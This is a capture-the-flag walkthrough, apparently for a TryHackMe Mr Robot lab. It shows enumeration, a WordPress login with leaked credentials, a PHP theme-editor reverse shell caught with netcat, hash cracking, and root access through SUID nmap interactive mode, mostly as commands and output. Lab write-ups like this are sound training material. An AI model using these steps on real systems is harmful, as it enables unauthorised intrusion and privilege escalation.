---
layout: default
title: Internal
description: THM - Internal
---

## Enumeration

Nmap Scan:
```
Nmap scan report for 10.10.190.33
Host is up (0.068s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```
Gobuster:
```
/images
/blog
/rss               
/sitemap             
/login                
/0                   
/feed                 
/video               
/image                
/atom                 
/wp-content          
/admin                
/audio               
/intro                
/wp-login            
/css                  
/rss2                 
/license            
/wp-includes         
/js                   
/Image                
/rdf                 
/page1               
/readme              
/robots             
/dashboard
```
/Robots:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```
The fsocity.dic file is a list of usernames that we could potentially use to bruteforce the wordpress login.

/License:
```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
do you want a password or something?
[REDACTED]
```

We found an ecrypted string. I'll throw it in cyberchef and see what comes up.
```
elliot:ER28-[REDACTED]
```
We found a login combination, so let's try in on the wordpress login page.

It worked!

We'll now upload the classic theme editor php shell, and see what's what.
```
nc -lvnp 9002                
Listening on 0.0.0.0 9002
Connection received on 10.10.190.33 36548
SOCKET: Shell has connected! PID: 2030
python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:~$ cd /home
cd /home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ 
```
We found a hash for the password to the "robot" user.

I deciphered it using hashes.com.
```
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
robot@linux:find / -perm /4000 
find / -perm /4000 
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
find: `/etc/ssl/private': Permission denied
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
We have nmap with SUID permissions. Let's take a look on gtfobins.
```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3[REDACTED]
```
We got the root key!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/mrrobot)


